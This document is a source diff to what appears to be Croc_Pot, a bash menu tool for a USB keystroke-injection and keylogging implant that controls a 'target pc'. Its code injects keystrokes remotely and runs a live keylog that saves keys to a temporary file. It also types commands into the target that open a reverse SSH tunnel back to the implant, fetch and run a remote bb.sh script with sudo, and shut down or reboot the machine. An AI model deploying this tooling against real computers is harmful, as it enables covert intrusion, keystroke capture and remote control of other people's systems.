+	14) double_up ; install_payloads ;; 15) q_attack ; install_payloads ;; 16) kb_killer ; install_payloads ;; 17) attack_mode ; install_payloads ;; 18) main_menu ;; 0) exit 0 ;; [bB]) menu_B ;; *) invalid_entry ; install_payloads ;;
 	esac
 }
 ##
@@ -6064,7 +6114,7 @@ else
 case $HOST_CHECK in
 raspberrypi)
 	read_all ENTER WORD TO QUACK AND PRESS [ENTER]
-	Q GUI d ; sleep 1 ; Q STRING "LXTerminal" ; Q ENTER ; Q ENTER ; sleep 1 ; Q STRING "${r_a}" ; Q ENTER  ; sleep 5 ; Q STRING "exit" ; Q ENTER ; Q ALT-TAB ;;
+	Q CONTROL-ALT-t ; sleep 1 ; Q STRING "${r_a}" ; Q ENTER  ; sleep 5 ; Q STRING "exit" ; Q ENTER ; Q ALT-TAB ;;
 parrot)
 	read_all ENTER WORD TO QUACK AND PRESS [ENTER]
 	Q ALT F2 ; sleep 1 ; Q STRING "mate-terminal" ; Q ENTER ; sleep 1 ; Q STRING "${r_a}" ; Q ENTER  ; sleep 5 ; Q STRING "exit" ; Q ENTER ; Q ALT-TAB ;;
@@ -6250,9 +6300,15 @@ select this option and start typing in remote terminal
 keystroke entry should display on target pc
 
 NOTE: Not all keystroke entry are working at the moment
--Ctrl+?, ESC, ALT, combination keys
 
--PRESS CTRL + C to stop loop in terminal
+-Alternet keystrokes entry
+-Press ALT-0 will execute (Q GUI)
+-Press ALT-4 will execute (Q ALT-F4)
+-Press ALT-5 will execute (Q GUI r)
+-Press ALT-6 will execute (Q GUI d)
+-Press ALT-7 will execute (Q GUI l)
+-Press ALT-8 will execute (Q CONTROL-ALT-d)
+-Press ALT-9 will execute (Q CONTROL-ALT-t)
 -Press F1 to return back to Croc_Pot menu')\n\n"
 	read_all START REMOTE KEYBOARD Y/N AND PRESS [ENTER]
 	case $r_a in
@@ -6260,8 +6316,8 @@ NOTE: Not all keystroke entry are working at the moment
 read_key_press() {
 if IFS= read -s -r -n1 key_press; then
 	while read -sN1 -t 0.001 ; do
-		key_press+="${REPLY}"
-	done
+	key_press+="${REPLY}"
+done
 fi
 }
 declare -a fnkey
@@ -6270,8 +6326,13 @@ for x in {1..12}; do
 	fnkey[$x]=${raw#^[}
 done
 while read_key_press; do
-case "${key_press}" in
-	$'\e'${fnkey[1]}) break ;;
+printf -v key_code "%d" "'$key_press"
+trap ctrl_c SIGINT
+ctrl_c () {
+	Q CONTROL-c ; echo -ne " CTRL-C "
+}
+case ${key_press} in
+	$'\e'${fnkey[1]}) echo -ne " F1 " ; trap - SIGINT ; break ;;
 	$'\e'${fnkey[2]}) Q F2 ; echo -ne " F2 " ;;
 	$'\e'${fnkey[3]}) Q F3 ; echo -ne " F3 " ;;
 	$'\e'${fnkey[4]}) Q F4 ; echo -ne " F4 " ;;
@@ -6283,20 +6344,87 @@ case "${key_press}" in
 	$'\e'${fnkey[10]}) Q F10 ; echo -ne " F10 " ;;
 	$'\e'${fnkey[11]}) Q F11 ; echo -ne " F11 " ;;
 	$'\e'${fnkey[12]}) Q F12 ; echo -ne " F12 " ;;
-	^D) exit ;;
+	$'\e[5~') Q KEYCODE 00,00,4b ; echo -ne " PAGEUP " ;;
+	$'\e[6~') Q PAGEDOWN ; echo -ne " PAGEDOWN " ;;
+	$'\e[2~') Q INSERT ; echo -ne " INSERT " ;;
+	$'\e[3~') Q DELETE ; echo -ne " DELETE " ;;
+	$'\e[H') Q HOME ; echo -ne " HOME " ;;
+	$'\e[F') Q END ; echo -ne " END " ;;
+	$'\033') Q ESCAPE ; echo -ne " ESC " ;;
 	$'\E[A') Q UPARROW ; echo -ne " UPARROW " ;;
 	$'\E[B') Q DOWNARROW ; echo -ne " DOWNARROW " ;;
 	$'\E[C') Q RIGHTARROW ; echo -ne " RIGHTARROW " ;;
 	$'\E[D') Q LEFTARROW ; echo -ne " LEFTARROW " ;;
 	$'\177') Q BACKSPACE ; echo -ne "\b \b" ;;
-	$'\0') Q ENTER ; echo -ne " ENTER \n" ;;
 	$'\x20') Q KEYCODE 00,00,2c ; echo -ne " " ;;
+	$'\e\e') Q ALT-ESCAPE ; echo -ne " ALT-ESC " ;;
+	$'\e\t') Q ALT-TAB ; echo -ne " ALT-TAB " ;;
+	$'\ed') Q ALT-d ; echo -ne " ALT-D " ;;
+	$'\e0') Q GUI ; echo -ne " GUI " ;;
+	$'\e1') Q ALT-1 ; echo -ne " ALT-1 " ;;
+	$'\e2') Q ALT-2 ; echo -ne " ALT-2 " ;;
+	$'\e3') Q ALT-3 ; echo -ne " ALT-3 " ;;
+	$'\e4') Q ALT-F4 ; echo -ne " ALT-F4 " ;;
+	$'\e5') Q GUI r ; echo -ne " GUI-R " ;;
+	$'\e6') Q GUI d ; echo -ne " GUI-D " ;;
+	$'\e7') Q GUI l ; echo -ne " GUI-L " ;;
+	$'\e8') Q CONTROL-ALT-d ; echo -ne " CONTROL-ALT-D \n" ;;
+	$'\e9') Q CONTROL-ALT-t ; echo -ne " CONTROL-ALT-T \n" ;;
+	$'\eW') Q ALT-SHIFT-w ; echo -ne " ALT-SHIFT-W \n" ;;
+	$'\eL') Q ALT-SHIFT-l ; echo -ne " ALT-SHIFT-L \n" ;;
+	$'\e[1;3P') Q ALT-F1 ; echo -ne " ALT-F1 " ;;
+	$'\e[1;3Q') Q ALT-F2 ; echo -ne " ALT-F2 " ;;
+	$'\e[1;3R') Q ALT-F3 ; echo -ne " ALT-F3 " ;;
+#	$'\e[1;3S') Q ALT-F4 ; echo -ne " ALT-F4 " ;;
+	$'\e[1;3A') Q ALT-UPARROW ; echo -ne " ALT-UPARROW \n" ;;
+	$'\e[1;3B') Q ALT-DOWNARROW ; echo -ne " ALT-DOWNARROW \n" ;;
+	$'\e[1;3C') Q ALT-RIGHTARROW ; echo -ne " ALT-RIGHTARROW \n" ;;
+	$'\e[1;3D') Q ALT-LEFTARROW ; echo -ne " ALT-LEFTARROW \n" ;;
+	$'\e[1;6A') Q CONTROL-SHIFT-UPARROW ; echo -ne " CTRL-SHIFT-UPARROW \n" ;;
+	$'\e[1;6B') Q CONTROL-SHIFT-DOWNARROW ; echo -ne " CTRL-SHIFT-DOWNARROW \n" ;;
+	$'\e[1;6C') Q CONTROL-SHIFT-RIGHTARROW ; echo -ne " CTRL-SHIFT-RIGHTARROW \n" ;;
+	$'\e[1;6D') Q CONTROL-SHIFT-LEFTARROW ; echo -ne " CTRL-SHIFT-LEFTARROW \n" ;;
+	$'\e[1;5A') Q CONTROL-UPARROW ; echo -ne " CTRL-UPARROW \n" ;;
+	$'\e[1;5B') Q CONTROL-DOWNARROW ; echo -ne " CTRL-DOWNARROW \n" ;;
+	$'\e[1;5C') Q CONTROL-RIGHTARROW ; echo -ne " CTRL-RIGHTARROW \n" ;;
+	$'\e[1;5D') Q CONTROL-LEFTARROW ; echo -ne " CTRL-LEFTARROW \n" ;;
+	$'\e[1;2A') Q SHIFT-UPARROW ; echo -ne " SHIFT-UPARROW \n" ;;
+	$'\e[1;2B') Q SHIFT-DOWNARROW ; echo -ne " SHIFT-DOWNARROW \n" ;;
+	$'\e[1;2C') Q SHIFT-RIGHTARROW ; echo -ne " SHIFT-RIGHTARROW \n" ;;
+	$'\e[1;2D') Q SHIFT-LEFTARROW ; echo -ne " SHIFT-LEFTARROW \n" ;;
+	$'\0') Q ENTER ; echo -ne " ENTER \n" ;;
+	$'\t') Q TAB ; echo -ne " TAB " ;;
+	$'\e[Z') Q SHIFT-TAB ; echo -ne " SHIFT-TAB \n" ;;
+	$'\x09') Q CONTROL-TAB ; echo -ne " CONTROL-TAB \n" ;;
+	[[:graph:]]) Q STRING "$key_press" ; echo -ne "$key_press" ;;
 	*)
-if [[ "$key_press" == [[:graph:]] ]]; then
-	Q STRING "$key_press" ; echo -ne "$key_press"
-elif [[ "$key_press" == "	" ]]; then
-	Q TAB ; echo -ne " TAB "
-fi ;;
+	case ${key_code} in
+		1) Q CONTROL-a ; echo -ne " CTRL-A \n" ;;
+		2) Q CONTROL-b ; echo -ne " CTRL-B \n" ;;
+		4) Q CONTROL-d ; echo -ne " CTRL-D \n" ;;
+		5) Q CONTROL-e ; echo -ne " CTRL-E \n" ;;
+		6) Q CONTROL-f ; echo -ne " CTRL-F \n" ;;
+		7) Q CONTROL-g ; echo -ne " CTRL-G \n" ;;
+		8) Q CONTROL-h ; echo -ne " CTRL-H \n" ;;
+		10) Q CONTROL-j ; echo -ne " CTRL-J \n" ;;
+		11) Q CONTROL-k ; echo -ne " CTRL-K \n" ;;
+		12) Q CONTROL-l ; echo -ne " CTRL-L \n" ;;
+		13) Q CONTROL-m ; echo -ne " CTRL-M \n" ;;
+		14) Q CONTROL-n ; echo -ne " CTRL-N \n" ;;
+		15) Q CONTROL-o ; echo -ne " CTRL-O \n" ;;
+		16) Q CONTROL-p ; echo -ne " CTRL-P \n" ;;
+		17) Q CONTROL-q ; echo -ne " CTRL-Q \n" ;;
+		18) Q CONTROL-r ; echo -ne " CTRL-R \n" ;;
+		19) Q CONTROL-s ; echo -ne " CTRL-S \n" ;;
+		20) Q CONTROL-t ; echo -ne " CTRL-T \n" ;;
+		21) Q CONTROL-u ; echo -ne " CTRL-U \n" ;;
+		22) Q CONTROL-v ; echo -ne " CTRL-V \n" ;;
+		23) Q CONTROL-w ; echo -ne " CTRL-W \n" ;;
+		24) Q CONTROL-x ; echo -ne " CTRL-X \n" ;;
+		25) Q CONTROL-y ; echo -ne " CTRL-Y \n" ;;
+		#---pressing CONTROL-z will exit press SHIFT-z to undo
+		26) Q CONTROL-z ; echo -ne " UNDO \n" ;;
+	esac
 esac
 done ;;
 [nN] | [nN][oO])
@@ -6474,7 +6602,6 @@ reload payload with (RELOAD_PAYLOADS) command
        NO OTHER PAYLOADS WILL EXECUTE BY KEYBOARD
 -Recommended to uninstall payload when not in use, do to match word
 -Press F1 to remove Live_keystroke payload and run RELOAD_PAYLOADS command 
-
 -PRESS CONTROL + C TO EXIT live keylog')\n\n"
 	read_all START LIVE KEYLOG Y/N AND PRESS [ENTER]
 case $r_a in
@@ -6499,13 +6626,13 @@ elif [[ \"\$LOOT\" == \"ALT\" ]]; then\n	echo -ne \" ALT\" >> /tmp/livekey.txt\n
 #----Start second terminal on target pc to reload payloads for (Live_Keystroke.txt)
 ##
 if [ "$(OS_CHECK)" = WINDOWS ]; then
-	Q GUI d ; Q GUI r ; sleep 1 ; Q STRING "powershell" ; Q ENTER ; sleep 2 ; Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
+	Q GUI d ; Q GUI r ; sleep 1 ; Q STRING "powershell" ; Q ENTER ; sleep 3 ; Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
 	Q ENTER ; sleep 2 ; Q STRING "$(sed -n 1p /tmp/CPW.txt)" ; Q ENTER ; sleep 2 ; Q STRING "RELOAD_PAYLOADS; exit" ; Q ENTER ; sleep 1 ; Q STRING "exit" ; Q ENTER ; sleep 1 ; Q GUI d
 else
 	case $HOST_CHECK in
 raspberrypi)
-	Q GUI d ; sleep 1 ; Q STRING "LXTerminal" ; Q ENTER ; Q ENTER ; sleep 1 ; Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
-	Q ENTER ; sleep 2 ; Q STRING "$(sed -n 1p /tmp/CPW.txt)" ; Q ENTER ; sleep 2 ; Q STRING "RELOAD_PAYLOADS; exit" ; Q ENTER ; sleep 1 ; Q STRING "exit" ; Q ENTER ; sleep 1 ; Q GUI d ;;
+	Q CONTROL-ALT-t ; sleep 1 ; Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
+	Q ENTER ; sleep 2 ; Q STRING "$(sed -n 1p /tmp/CPW.txt)" ; Q ENTER ; sleep 2 ; Q STRING "RELOAD_PAYLOADS; exit" ; Q ENTER ; sleep 1 ; Q STRING "exit" ; Q ENTER ; sleep 1 ; Q CONTROL-ALT-d ;;
 parrot)
 	Q ALT F2 ; sleep 1 ; Q STRING "mate-terminal" ; Q ENTER ; sleep 1 ; Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
 	Q ENTER ; sleep 2 ; Q STRING "$(sed -n 1p /tmp/CPW.txt)" ; Q ENTER ; sleep 2 ; Q STRING "RELOAD_PAYLOADS; exit" ; Q ENTER ; sleep 1 ; Q STRING "exit" ; Q ENTER ; sleep 1 ; Q GUI d ;;
@@ -6888,7 +7015,8 @@ menu_A
 function croc_edit_menu() {
 	clear
 	echo -ne "$(Info_Screen '
--Edit keycroc files with nano')\n"
+-Edit keycroc files with nano
+-Select ATTACKMODE MODE')\n"
 cd / ; for i in `ls -d */ | wc -l` ; do echo -ne "${yellow}Directory count:${clear}${green}${i}${clear}\n"; done
 cd / ; for i in `ls -d ` ; do g=`find ./$i -type f -print | wc -l`; echo -ne "${yellow}file count:${clear}${green}${g}${clear}\n"; done 2> /dev/null
 ##
@@ -6995,11 +7123,20 @@ MenuTitle MIDNIGHT COMMANDER MENU ; MenuColor 26 1 INSTALL MIDNIGHT COMMANDER ; 
 ##
 #----Croc_Pot Edit Menu
 ##
-MenuTitle CROC EDIT MENU ; MenuColor 22 1 CROC PAYLOADS FOLDER ; MenuColor 22 2 CROC TOOLS FOLDER ; MenuColor 22 3 CROC LOOT FOLDER ; MenuColor 22 4 CROC CONFIG FILE ; MenuColor 22 5 CROC ENTER FILE NAME ; MenuColor 22 6 CROC REMOVE FILES
-MenuColor 22 7 ATTACKMODE HID STORAGE ; MenuColor 22 8 ATTACKMODE HID ; MenuColor 22 9 RELOAD_PAYLOADS ; MenuColor 21 10 MIDNIGHT MANAGER ; MenuColor 21 11 RETURN TO MAIN MENU ; MenuEnd 25
+MenuTitle CROC EDIT MENU
+echo -ne "\t\t" ; MenuColor 22 1 CROC PAYLOADS FOLDER | tr -d '\t\n' ; MenuColor 22 8 ATTACKMODE HID | tr -d '\t'
+echo -ne "\t\t" ; MenuColor 22 2 CROC TOOLS FOLDER | tr -d '\t\n' ; MenuColor 22 9 RELOAD_PAYLOADS | tr -d '\t'
+echo -ne "\t\t" ; MenuColor 22 3 CROC LOOT FOLDER | tr -d '\t\n' ; MenuColor 21 10 ATTACKMODE OFF | tr -d '\t'
+echo -ne "\t\t" ; MenuColor 22 4 CROC CONFIG FILE | tr -d '\t\n' ; MenuColor 21 11 ARMING_MODE | tr -d '\t'
+echo -ne "\t\t" ; MenuColor 22 5 CROC ENTER FILE NAME | tr -d '\t\n' ; MenuColor 21 12 ATTACKMODE RO_STORGE | tr -d '\t'
+echo -ne "\t\t" ; MenuColor 22 6 CROC REMOVE FILES | tr -d '\t\n' ; MenuColor 21 13 ATTACKMODE ETHERNET | tr -d '\t'
+echo -ne "\t\t" ; MenuColor 22 7 ATTACKMODE STORAGE | tr -d '\t\n' ; MenuColor 21 14 MIDNIGHT MANAGER | tr -d '\t'
+MenuColor 21 15 RETURN TO MAIN MENU
+MenuEnd 25
 	case $m_a in
 	1) edit_all /root/udisk/payloads ; croc_edit_menu ;; 2) edit_all /root/udisk/tools ; croc_edit_menu ;; 3) edit_all /root/udisk/loot ; croc_edit_menu ;; 4) edit_config ; croc_edit_menu ;; 5) user_edit ; croc_edit_menu ;; 6) remove_file ; croc_edit_menu ;;
-	7) ATTACKMODE HID STORAGE ; croc_edit_menu ;; 8) ATTACKMODE HID ; croc_edit_menu ;; 9) RELOAD_PAYLOADS ; croc_edit_menu ;; 10) midnight_manager ; croc_edit_menu ;; 11) main_menu ;; 0) exit 0 ;; [bB]) main_menu ;; *) invalid_entry ; croc_edit_menu ;;
+	7) ATTACKMODE HID STORAGE ; croc_edit_menu ;; 8) ATTACKMODE HID ; croc_edit_menu ;; 9) RELOAD_PAYLOADS ; croc_edit_menu ;; 10) ATTACKMODE OFF ; croc_edit_menu ;; 11) ARMING_MODE ; croc_edit_menu ;; 12) ATTACKMODE RO_STORGE ; croc_edit_menu ;;
+	13) ATTACKMODE AUTO_ETHERNET ; croc_edit_menu ;; 14) midnight_manager ; croc_edit_menu ;; 15) main_menu ;; 0) exit 0 ;; [bB]) main_menu ;; *) invalid_entry ; croc_edit_menu ;;
 	esac
 }
 ##
@@ -7403,7 +7540,7 @@ if [ "$(OS_CHECK)" = LINUX ]; then
 [yY] | [yY][eE][sS])
 	case $HOST_CHECK in
 	raspberrypi)
-		Q GUI d ; sleep 1 ; Q STRING "LXTerminal" ; Q ENTER ; Q ENTER ; sleep 1 ; Q STRING "i=\$(whoami)" ; Q ENTER ; Q STRING "if [ -e /home/\${i}/bb.sh ]; then"
+		Q CONTROL-ALT-t ; sleep 1 ; Q STRING "i=\$(whoami)" ; Q ENTER ; Q STRING "if [ -e /home/\${i}/bb.sh ]; then"
 		Q ENTER ; Q STRING "echo \"bb.sh is installed\"" ; Q ENTER ; Q STRING "else" ; Q ENTER ; Q STRING "echo \"installing bb.sh\"" ; Q ENTER
 		Q STRING "wget bashbunny.com/bb.sh" ; Q ENTER ; Q STRING "fi" ; Q ENTER ; sleep 2 ; Q STRING "sudo bash ./bb.sh" ; Q ENTER ; sleep 3
 		Q STRING "c" ; sleep 2 ; Q STRING "exit" ; Q ENTER ; Q ALT-TAB ;;
@@ -7463,7 +7600,7 @@ if [ "$(OS_CHECK)" = WINDOWS ]; then
 else
 case $HOST_CHECK in
 raspberrypi)
-	Q GUI d ; sleep 1 ; Q STRING "LXTerminal" ; Q ENTER ; Q ENTER ; sleep 1 ; Q STRING "ssh root@172.16.64.1" ; Q ENTER ;;
+	Q CONTROL-ALT-t ; sleep 1 ; Q STRING "ssh root@172.16.64.1" ; Q ENTER ;;
 parrot)
 	Q ALT F2 ; sleep 1 ; Q STRING "mate-terminal" ; Q ENTER ; sleep 1 ; Q STRING "ssh root@172.16.64.1" ; Q ENTER ;;
 *)
@@ -7641,7 +7778,7 @@ case $r_a in
 else
 case $HOST_CHECK in
 raspberrypi)
-	Q GUI d ; sleep 1 ; Q STRING "LXTerminal" ; Q ENTER ; Q ENTER ; sleep 1
+	Q CONTROL-ALT-t ; sleep 1
 	Q STRING "ssh -fN -R ${r_a}:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
 	Q ENTER ; sleep 2 ; Q STRING "$(sed -n 1p /tmp/CPW.txt)" ; Q ENTER ; sleep 1 ; Q STRING "exit" ; Q ENTER ; sleep 1 ; Q ALT-TAB ; start_shell ;;
 parrot)
@@ -8030,7 +8167,7 @@ Download center and place on root of the KeyCroc drive
 -This will Verify sha256 checksum after download
 -3356d9f80dedd4c3afd0a9014e966a692272f83ff3256e8a2a3dd4e60544740e
 -After download unplug keycroc plug back in
--Wait until the LED RED & BLUE stop flashing')\n"
+-Wait until the LED RED & BLUE stop flashing')\n\n"
 if [ -e /root/udisk/kc_fw_1.3_510.tar.gz ]; then
 	echo -ne "\n$(ColorGreen 'KeyCroc lastest firmware file already exists')\n"
 else
@@ -8145,7 +8282,7 @@ if [ "$(OS_CHECK)" = WINDOWS ]; then
 else
 	case $HOST_CHECK in
 raspberrypi)
-	Q GUI d ; sleep 1 ; Q STRING "LXTerminal" ; Q ENTER ; Q ENTER ; sleep 1 ; Q STRING "shutdown -h 0"  ; Q ENTER ;;
+	Q CONTROL-ALT-t ; sleep 1 ; Q STRING "shutdown -h 0"  ; Q ENTER ;;
 parrot)
 	Q ALT F2 ; sleep 1 ; Q STRING "mate-terminal" ; Q ENTER ; sleep 1 ; Q STRING "shutdown -h 0" ; Q ENTER ;;
 *)
@@ -8162,7 +8299,7 @@ if [ "$(OS_CHECK)" = WINDOWS ]; then
 else
 	case $HOST_CHECK in
 raspberrypi)
-	Q GUI d ; sleep 1 ; Q STRING "LXTerminal" ; Q ENTER ; Q ENTER ; sleep 1 ; Q STRING "shutdown -r 0" ; Q ENTER ;;
+	Q CONTROL-ALT-t ; sleep 1 ; Q STRING "shutdown -r 0" ; Q ENTER ;;
 parrot)
 	Q ALT F2 ; sleep 1 ; Q STRING "mate-terminal" ; Q ENTER ; sleep 1 ; Q STRING "shutdown -r 0" ; Q ENTER ;;
 *)
@@ -8209,7 +8346,7 @@ esac
 #----Recovery main menu
 ##
 MenuTitle KEYCROC RECOVERY MENU ; MenuColor 27 1 DOWNLOAD LATEST FIRMWARE ; MenuColor 27 2 KEYCROC DOCS.HAK5 WEBSITE ; MenuColor 27 3 REPAIR en_US.UTF-8 ERROR ; MenuColor 27 4 KEYCROC UPDATE PACKAGES
-MenuColor 27 5 REMOVE CROC_POT AN CONTENTS ; MenuColor 27 6 REBOOT/SHUTDOWN TARGET PC ; MenuColor 27 7 CHANGE KEYCROC TIMEZONE ; MenuColor 26 8 RETURN TO MAIN MENU ; MenuEnd 30
+MenuColor 27 5 REMOVE CROC_POT AN CONTENTS ; MenuColor 27 6 REBOOT/SHUTDOWN TARGET PC ; MenuColor 27 7 CHANGE KEYCROC TIMEZONE ; MenuColor 27 8 RETURN TO MAIN MENU ; MenuEnd 30
 	case $m_a in
 	1) croc_firmware ; croc_recovery ;; 2) start_web https://docs.hak5.org/key-croc/ ; croc_recovery ;; 3) locale_en_US ; croc_recovery ;; 4) croc_update ; croc_recovery ;;
 	5) remove_croc_pot ;; 6) reboot_shutdown ; croc_recovery ;; 7) croc_clock ; croc_recovery ;; 8) main_menu ;; 0) exit 0 ;; [bB]) main_menu ;; *) invalid_entry ; croc_recovery ;;
@@ -8311,7 +8448,7 @@ else
 sleep 5\nOS_CHECK=\$(sed -n 1p \${CROC_OS})\nif [ \"\${OS_CHECK}\" = WINDOWS ]; then\nQ GUI d\nQ GUI r\nsleep 1\nQ STRING \"powershell\"
 Q ENTER\nsleep 2\nQ STRING \"Start-Process http://\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"
 Q ENTER\nsleep 5\nQ ALT-TAB\nsleep 2\nQ STRING \"exit\"\nQ ENTER\nelse\nHOST_CHECK=\$(sed -n 3p \${CROC_OS})\ncase \$HOST_CHECK in
-raspberrypi)\nQ GUI d\nsleep 1\nQ STRING \"terminal\"\nQ ENTER\nQ ENTER\nsleep 1\nQ STRING \"gio open http://\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"
+raspberrypi)\nQ CONTROL-ALT-d\nQ CONTROL-ALT-t\nsleep 1\nQ STRING \"gio open http://\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"
 Q ENTER\nsleep 5\nQ ALT-TAB\nsleep 1\nQ ALT-F4;;\nparrot)\nQ ALT F2\nsleep 1\nQ STRING \"mate-terminal\"\nQ ENTER\nsleep 1
 Q STRING \"gio open http://\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"\nQ ENTER\nsleep 5\nQ ALT-TAB
 sleep 1\nQ ALT-F4;;\n*)\nQ ALT F2\nsleep 1\nQ STRING \"xterm\"\nQ ENTER\nsleep 1\nQ STRING \"gio open http://\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"
